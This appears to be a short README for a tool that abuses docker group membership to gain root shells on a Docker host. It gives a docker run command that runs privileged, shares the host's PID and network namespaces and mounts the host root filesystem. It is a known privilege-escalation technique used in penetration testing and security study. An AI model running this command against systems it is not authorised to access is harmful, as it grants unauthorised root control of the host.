# dockergroupabuse

Abusing the `docker` group to get root shells on minimal images that might be stored on a Docker host.

## Usage

Build the Docker image on the host using the Dockerfiles provided.

```
docker build -t [image-name] .
docker run --rm --privileged --pid=host --net=host -itv /:/host [image-name]
```
### About SH vs Bash

I have defaulted to using `sh` instead of `bash` in the commands in order to be cross-compatible with Alpine-based images and such.

Feel free to call `bash` from `sh`.
